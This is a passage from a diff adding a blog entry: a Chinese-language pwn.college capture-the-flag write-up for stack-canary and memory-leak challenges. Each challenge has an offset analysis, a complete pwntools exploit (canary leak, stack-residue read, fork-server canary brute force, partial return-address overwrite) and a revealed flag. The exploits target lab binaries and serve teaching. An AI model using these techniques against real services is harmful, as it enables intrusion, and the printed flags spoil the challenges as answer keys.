class="line">    <span class="keyword">if</span> exploit(): <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">pwn.college{sISl_MjbdZ-M6Xu-jeMXu-Gxj89.0VMxMDL4cjM1gzW}</span></span>
+<h1 id="recursive-ruin-hard">Recursive Ruin (Hard)</h1>
+<h2 id="analysis-17">Analysis</h2>
+<p>Hard 版同样是两阶段利用。区别只是缓冲区更小，偏移更短。</p>
+<ul>
+<li><code>buf</code> -&gt; <code>RBP - 0x20</code></li>
+<li><code>canary</code> -&gt; <code>RBP - 8</code></li>
+<li><code>buf</code> to <code>canary</code> offset = 24 bytes</li>
+</ul>
+<h2 id="exploit-16">Exploit</h2>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;error&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>():</span><br><span class="line">    p = process(<span class="string">&quot;/challenge/recursive-ruin-hard&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p.sendlineafter(<span class="string">b&quot;Payload size:&quot;</span>, <span class="string">b&quot;25&quot;</span>)</span><br><span class="line">        payload1 = <span class="string">b&quot;REPEAT&quot;</span>.ljust(<span class="number">24</span>, <span class="string">b&quot;A&quot;</span>) + <span class="string">b&quot;X&quot;</span></span><br><span class="line">        p.sendafter(<span class="string">b&quot;bytes)!\n&quot;</span>, payload1)</span><br><span class="line"></span><br><span class="line">        p.recvuntil(<span class="string">b&quot;You said: &quot;</span>)</span><br><span class="line">        p.recv(<span class="number">25</span>)</span><br><span class="line">        canary = <span class="string">b&quot;\x00&quot;</span> + p.recv(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">        p.sendlineafter(<span class="string">b&quot;Payload size:&quot;</span>, <span class="string">b&quot;42&quot;</span>)</span><br><span class="line">        payload2 = <span class="string">b&quot;A&quot;</span> * <span class="number">24</span> + canary + <span class="string">b&quot;B&quot;</span> * <span class="number">8</span> + <span class="string">b&quot;\x6b\x1c&quot;</span></span><br><span class="line">        p.sendafter(<span class="string">b&quot;bytes)!\n&quot;</span>, payload2)</span><br><span class="line"></span><br><span class="line">        result = p.recvall(timeout=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&quot;pwn.college&#123;&quot;</span> <span class="keyword">in</span> result:</span><br><span class="line">            <span class="built_in">print</span>(result.decode())</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span>: <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">finally</span>: p.close()</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> itertools.count():</span><br><span class="line">    <span class="keyword">if</span> exploit(): <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">pwn.college{…}</span></span>
+<h1 id="lingering-leftover-easy">Lingering Leftover (Easy)</h1>
+<blockquote>
+<p>Leak data left behind unintentionally by utilizing clever payload
+construction.</p>
+</blockquote>
+<h2 id="analysis-18">Analysis</h2>
+<p>这一题不是主动泄露，而是<strong>栈残留 (stack
+residual)</strong>。程序前面读过 flag，虽然没有再打印 flag
+buffer，但残留内容还躺在栈上。</p>
+<ul>
+<li><code>buf</code> -&gt; <code>0x7ffc740163f0</code></li>
+<li>flag at <code>0x7ffc7401646a</code></li>
+<li>distance -&gt; 122 bytes</li>
+</ul>
+<h2 id="exploit-17">Exploit</h2>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;/challenge/lingering-leftover-easy&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;122&quot;</span>)</span><br><span class="line">p.send(<span class="string">b&quot;A&quot;</span> * <span class="number">122</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">pwn.college{Ip-rheFTFOTZw6iCFe4JX-YqSUV29vW.01MxMDL4cjM1gzW}</span></span>
+<h1 id="lingering-leftover-hard">Lingering Leftover (Hard)</h1>
+<h2 id="analysis-19">Analysis</h2>
+<p>Hard 版也是同一个思路，从函数之间的栈复用关系里确认 flag 的位置。</p>
+<ul>
+<li><code>buf</code> -&gt; <code>RBP - 0x200</code></li>
+<li>flag read to <code>RBP - 0x160 + 0x56</code></li>
+<li>distance = <code>0x200 - 0x160 + 0x56 = 246</code> bytes</li>
+</ul>
+<h2 id="exploit-18">Exploit</h2>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;/challenge/lingering-leftover-hard&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;246&quot;</span>)</span><br><span class="line">p.send(<span class="string">b&quot;A&quot;</span> * <span class="number">246</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">pwn.college{UOnuy5KfSK49QeGSt2X8WSjScbk.0FNxMDL4cjM1gzW}</span></span>
+<h1 id="latent-leak-easy">Latent Leak (Easy)</h1>
+<blockquote>
+<p>Leak data left behind unintentionally to defeat a stack canary in a
+PIE binary.</p>
+</blockquote>
+<h2 id="analysis-20">Analysis</h2>
+<p>利用<strong>未初始化栈内容</strong>去捞一份 canary 副本。</p>
+<ul>
+<li><code>buf</code> -&gt; <code>0x7ffd91a01960</code></li>
+<li>canary copy at <code>0x7ffd91a019e8</code></li>
+<li>distance = 136 bytes</li>
+</ul>
+<h2 id="exploit-19">Exploit</h2>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;error&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>():</span><br><span class="line">    p = process(<span class="string">&quot;/challenge/latent-leak-easy&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p.sendlineafter(<span class="string">b&quot;Payload size:&quot;</span>, <span class="string">b&quot;137&quot;</span>)</span><br><span class="line">        payload1 = <span class="string">b&quot;REPEAT&quot;</span>.ljust(<span class="number">136</span>, <span class="string">b&quot;A&quot;</span>) + <span class="string">b&quot;X&quot;</span></span><br><span class="line">        p.sendafter(<span class="string">b&quot;bytes)!\n&quot;</span>, payload1)</span><br><span class="line"></span><br><span class="line">        p.recvuntil(<span class="string">b&quot;You said: &quot;</span>)</span><br><span class="line">        p.recv(<span class="number">137</span>)</span><br><span class="line">        canary = <span class="string">b&quot;\x00&quot;</span> + p.recv(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">        p.sendlineafter(<span class="string">b&quot;Payload size:&quot;</span>, <span class="string">b&quot;426&quot;</span>)</span><br><span class="line">        payload2 = <span class="string">b&quot;A&quot;</span> * <span class="number">408</span> + canary + <span class="string">b&quot;B&quot;</span> * <span class="number">8</span> + <span class="string">b&quot;\xd4\x1f&quot;</span></span><br><span class="line">        p.sendafter(<span class="string">b&quot;bytes)!\n&quot;</span>, payload2)</span><br><span class="line"></span><br><span class="line">        result = p.recvall(timeout=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&quot;pwn.college&#123;&quot;</span> <span class="keyword">in</span> result:</span><br><span class="line">            <span class="built_in">print</span>(result.decode())</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span>: <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">finally</span>: p.close()</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> itertools.count():</span><br><span class="line">    <span class="keyword">if</span> exploit(): <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">pwn.college{USkSWFY_9ZoRpm_X4bbinvVet1i.0VNxMDL4cjM1gzW}</span></span>
+<h1 id="latent-leak-hard">Latent Leak (Hard)</h1>
+<h2 id="analysis-21">Analysis</h2>
+<p>Hard 版需定位 canary copy 在栈上的位置。</p>
+<ul>
+<li><code>buf</code> -&gt; <code>var_170h</code></li>
+<li>canary copy at <code>RBP - 0x118</code></li>
+<li>distance = 88 bytes</li>
+</ul>
+<h2 id="exploit-20">Exploit</h2>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;error&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>():</span><br><span class="line">    p = process(<span class="string">&quot;/challenge/latent-leak-hard&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p.sendlineafter(<span class="string">b&quot;Payload size:&quot;</span>, <span class="string">b&quot;89&quot;</span>)</span><br><span class="line">        payload1 = <span class="string">b&quot;REPEAT&quot;</span>.ljust(<span class="number">88</span>, <span class="string">b&quot;A&quot;</span>) + <span class="string">b&quot;X&quot;</span></span><br><span class="line">        p.sendafter(<span class="string">b&quot;bytes)!\n&quot;</span>, payload1)</span><br><span class="line"></span><br><span class="line">        p.recvuntil(<span class="string">b&quot;You said: &quot;</span>)</span><br><span class="line">        p.recv(<span class="number">89</span>)</span><br><span class="line">        canary = <span class="string">b&quot;\x00&quot;</span> + p.recv(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">        p.sendlineafter(<span class="string">b&quot;Payload size:&quot;</span>, <span class="string">b&quot;378&quot;</span>)</span><br><span class="line">        payload2 = <span class="string">b&quot;A&quot;</span> * <span class="number">360</span> + canary + <span class="string">b&quot;B&quot;</span> * <span class="number">8</span> + <span class="string">b&quot;\x3a\x18&quot;</span></span><br><span class="line">        p.sendafter(<span class="string">b&quot;bytes)!\n&quot;</span>, payload2)</span><br><span class="line"></span><br><span class="line">        result = p.recvall(timeout=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&quot;pwn.college&#123;&quot;</span> <span class="keyword">in</span> result:</span><br><span class="line">            <span class="built_in">print</span>(result.decode())</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span>: <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">finally</span>: p.close()</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> itertools.count():</span><br><span class="line">    <span class="keyword">if</span> exploit(): <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">pwn.college{4Tl0_0M2VD2swhMKrBqyJ-NmVRB.0lNxMDL4cjM1gzW}</span></span>
+<h1 id="fork-foolery-easy">Fork Foolery (Easy)</h1>
+<blockquote>
+<p>Defeat a stack canary in a PIE binary by utilizing a network-style
+fork server in the target binary.</p>
+</blockquote>
+<h2 id="analysis-22">Analysis</h2>
+<p>fork 出来的子进程会继承父进程的
+canary。我们可以通过<strong>逐字节爆破 (byte-by-byte
+brute-force)</strong> 来获取 canary。</p>
+<ul>
+<li><code>buf</code> to <code>canary</code> offset = 120 bytes</li>
+</ul>
+<h2 id="exploit-21">Exploit</h2>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;error&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_canary</span>():</span><br><span class="line">    canary = <span class="string">b&quot;\x00&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        <span class="keyword">for</span> guess <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">            p = remote(<span class="string">&quot;localhost&quot;</span>, <span class="number">1337</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                payload = <span class="string">b&quot;A&quot;</span> * <span class="number">120</span> + canary + <span class="built_in">bytes</span>([guess])</span><br><span class="line">                p.sendlineafter(<span class="string">b&quot;Payload size:&quot;</span>, <span class="built_in">str</span>(<span class="built_in">len</span>(payload)).encode())</span><br><span class="line">                p.sendafter(<span class="string">b&quot;bytes)!\n&quot;</span>, payload)</span><br><span class="line">                result = p.recvall(timeout=<span class="number">0.1</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">b&quot;stack smashing detected&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> result:</span><br><span class="line">                    canary += <span class="built_in">bytes</span>([guess])</span><br><span class="line">                    p.close(); <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span>: <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">finally</span>: p.close()</span><br><span class="line">    <span class="keyword">return</span> canary</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn_it</span>(<span class="params">canary</span>):</span><br><span class="line">    <span class="keyword">for</span> attempts <span class="keyword">in</span> itertools.count():</span><br><span class="line">        f = attempts % <span class="number">16</span></span><br><span class="line">        p = remote(<span class="string">&quot;localhost&quot;</span>, <span class="number">1337</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            payload = <span class="string">b&quot;A&quot;</span> * <span class="number">120</span> + canary + <span class="string">b&quot;B&quot;</span> * <span class="number">8</span> + p16(<span class="number">0x289</span> + <span class="number">0x1000</span> * f)</span><br><span class="line">            p.sendlineafter(<span class="string">b&quot;Payload size:&quot;</span>, <span class="built_in">str</span>(<span class="built_in">len</span>(payload)).encode())</span><br><span class="line">            p.sendafter(<span class="string">b&quot;bytes)!\n&quot;</span>, payload)</span><br><span class="line">            result = p.recvall(timeout=<span class="number">0.2</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&quot;pwn.college&#123;&quot;</span> <span class="keyword">in</span> result:</span><br><span class="line">                <span class="built_in">print</span>(result.decode()); p.close(); <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>: <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">finally</span>: p.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    c = get_canary()</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(c) == <span class="number">8</span>: pwn_it(c)</span><br></pre></td></tr></table></figure>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">pwn.college{AkjeEdJtTF04io9yqVyjy88wkvF.01NxMDL4cjM1gzW}</span></span>
+<h1 id="fork-foolery-hard">Fork Foolery (Hard)</h1>
+<h2 id="analysis-23">Analysis</h2>
+<p>Hard 版同样是 fork server 爆破。</p>
+<ul>
+<li><code>buf</code> to <code>canary</code> offset = 120 bytes</li>
+<li>target <code>win_authed</code> offset = <code>0x9db</code></li>
+</ul>
+<h2 id="exploit-22">Exploit</h2>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;error&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_canary</span>():</span><br><span class="line">    canary = <span class="string">b&quot;\x00&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        <span class="keyword">for</span> guess <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">            p = remote(<span class="string">&quot;localhost&quot;</span>, <span class="number">1337</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                payload = <span class="string">b&quot;A&quot;</span> * <span class="number">120</span> + canary + <span class="built_in">bytes</span>([guess])</span><br><span class="line">                p.sendlineafter(<span class="string">b&quot;Payload size:&quot;</span>, <span class="built_in">str</span>(<span class="built_in">len</span>(payload)).encode())</span><br><span class="line">                p.sendafter(<span class="string">b&quot;bytes)!\n&quot;</span>, payload)</span><br><span class="line">                result = p.recvall(timeout=<span class="number">0.1</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">b&quot;stack smashing detected&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> result:</span><br><span class="line">                    canary += <span class="built_in">bytes</span>([guess])</span><br><span class="line">                    p.close(); <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span>: <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">finally</span>: p.close()</span><br><span class="line">    <span class="keyword">return</span> canary</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn_it</span>(<span class="params">canary</span>):</span><br><span class="line">    <span class="keyword">for</span> attempts <span class="keyword">in</span> itertools.count():</span><br><span class="line">        f = attempts % <span class="number">16</span></span><br><span class="line">        p = remote(<span class="string">&quot;localhost&quot;</span>, <span class="number">1337</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            payload = <span class="string">b&quot;A&quot;</span> * <span class="number">120</span> + canary + <span class="string">b&quot;B&quot;</span> * <span class="number">8</span> + p16(<span class="number">0x9db</span> + <span class="number">0x1000</span> * f)</span><br><span class="line">            p.sendlineafter(<span class="string">b&quot;Payload size:&quot;</span>, <span class="built_in">str</span>(<span class="built_in">len</span>(payload)).encode())</span><br><span class="line">            p.sendafter(<span class="string">b&quot;bytes)!\n&quot;</span>, payload)</span><br><span class="line">            result = p.recvall(timeout=<span class="number">0.2</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&quot;pwn.college&#123;&quot;</span> <span class="keyword">in</span> result:</span><br><span class="line">                <span class="built_in">print</span>(result.decode()); p.close(); <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>: <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">finally</span>: p.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    c = get_canary()</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(c) == <span class="number">8</span>: pwn_it(c)</span><br></pre></td></tr></table></figure>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">pwn.college{wQr_iWOgYTj48UrRNGXxYBBRJow.0FOxMDL4cjM1gzW}</span></span>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>pwn</tag>
+        <tag>writeup</tag>
+        <tag>pwncollege</tag>
+        <tag>memory-corruption</tag>
+      </tags>
+  </entry>
 </search>
